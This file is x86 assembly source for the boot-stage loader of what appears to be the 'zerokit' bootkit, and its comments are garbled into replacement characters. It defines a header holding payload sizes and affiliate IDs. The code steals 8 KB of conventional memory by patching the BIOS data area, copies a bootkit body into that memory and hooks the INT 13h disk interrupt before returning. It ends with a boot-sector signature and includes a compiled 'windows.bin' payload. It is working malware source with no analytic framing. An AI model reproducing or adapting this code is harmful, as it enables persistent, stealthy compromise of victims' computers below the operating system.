org 400h                                                    ; � ������ 512 ������ ��������� ��� VBR-������ (� �������� ���� ������ �������).

jmp    l_start
; ����� ��������� zerokit_header_t
zhdr_pack_size dd 0
zhdr_bk_size dd 0
zhdr_bk_payload32_size dd 0
zhdr_bk_payload64_size dd 0
zhdr_conf_size dd 0
zhdr_bundle_size dd 0
zhdr_bundle_affid dd 0
zhdr_bundle_subid dd 0
l_start:
push   cs
pop    ds                                                     ; � ds ����� ��� ����� ������� ~ 3000h.
xor    eax, eax
mov    es, ax                                                 ; �������� es � ��������� ��������.
mov    si, 0x413                                                                   ; ������ ������� ������ � ���������� (BIOS Data Area (0040h:0013h))
                                                                                   ; �� ������ 0x413 ��������� �����, � ������� ���������� ���������� ��������� ������ � �������� ������ 640 ��.
sub    [es:si], word 8                                                             ; ����������� ��� ���� 8��.
es     lodsw                                                                       ; 
shl    ax, 6                                                                       ; * 1024 / 16
mov    es, ax                                                                      ; ������� �������� �����.
xor    di, di                                                                      ; �������� �������� �����.
mov    si, 2048                                                                    ; �������� ��������� ����� (�������� ��� ��������� windows.asm).
mov    ecx, l_zbk_body_end - l_zbk_body_begin                                      ; ������ ���������� ������ � ������.
rep    movsb                                                                       ; �������� ��� ��� � ���������� �����.

push   word 0
pop    ds

mov    eax, [0x13 * 4]                                                             ; ��������� ������������ ���������� ����������.
mov    [es:1], eax                                                                 ; ��������� ��� � �������� �������� ���������� jmp.
mov    [0x13 * 4], word 6                                                          ; ������������� ���� ���������� (�������� �� hook_proc_int_13h � windows.asm).
mov    [0x13 * 4 + 2], es

ret

times 510 - ($ - $$) db 0x90

dw 0xAA55

l_zbk_body_begin:
file "..\bin\windows.bin"
l_zbk_body_end: